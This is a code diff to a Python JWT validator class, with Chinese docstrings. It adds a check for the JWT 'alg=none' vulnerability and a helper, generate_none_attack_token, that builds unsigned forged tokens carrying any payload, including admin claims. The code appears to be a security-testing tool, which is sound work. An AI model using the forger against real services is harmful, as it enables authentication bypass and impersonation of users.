@@ -315,6 +315,89 @@ class JWTValidator:
 
         return info
 
+    def check_none_algorithm_attack(self, token: str) -> Dict[str, Any]:
+        """
+        检测JWT none算法攻击漏洞
+        
+        攻击原理：
+        1. 将alg设为none
+        2. 移除签名部分
+        3. 修改payload伪造任意用户身份
+        
+        Returns:
+            检测结果字典
+        """
+        result = {
+            'vulnerable': False,
+            'algorithm_in_token': None,
+            'can_forge_admin': False,
+            'details': ''
+        }
+        
+        try:
+            if token.startswith('Bearer '):
+                token = token[7:]
+            
+            parts = token.split('.')
+            if len(parts) != 3:
+                result['details'] = 'Invalid JWT format'
+                return result
+            
+            import base64
+            import json
+            
+            header_b64 = parts[0]
+            padding = 4 - len(header_b64) % 4
+            if padding != 4:
+                header_b64 += '=' * padding
+            
+            header_bytes = base64.urlsafe_b64decode(header_b64)
+            header = json.loads(header_bytes.decode('utf-8'))
+            
+            result['algorithm_in_token'] = header.get('alg')
+            
+            if header.get('alg') == 'none':
+                result['vulnerable'] = True
+                result['details'] = 'Token uses alg=none - attacker can forge arbitrary tokens'
+                
+                payload = self.decode_jwt_payload(token)
+                if payload:
+                    if payload.get('role') == 'admin' or payload.get('is_admin') or payload.get('admin') == True:
+                        result['can_forge_admin'] = True
+            
+            elif header.get('alg') in ['HS256', 'HS384', 'HS512']:
+                result['details'] = 'Token uses symmetric algorithm - possible to brute force if weak secret'
+            
+            return result
+            
+        except Exception as e:
+            result['details'] = f'Analysis failed: {e}'
+            return result
+    
+    def generate_none_attack_token(self, payload: Dict) -> str:
+        """
+        生成none算法攻击token（用于测试）
+        
+        Args:
+            payload: 要伪造的payload
+            
+        Returns:
+            攻击用JWT token
+        """
+        import base64
+        import json
+        
+        header = {'alg': 'none', 'typ': 'JWT'}
+        header_b64 = base64.urlsafe_b64encode(
+            json.dumps(header).encode()
+        ).decode().rstrip('=')
+        
+        payload_b64 = base64.urlsafe_b64encode(
+            json.dumps(payload).encode()
+        ).decode().rstrip('=')
+        
+        return f"{header_b64}.{payload_b64}."
+
 
 class MFAFlowHandler:
     """
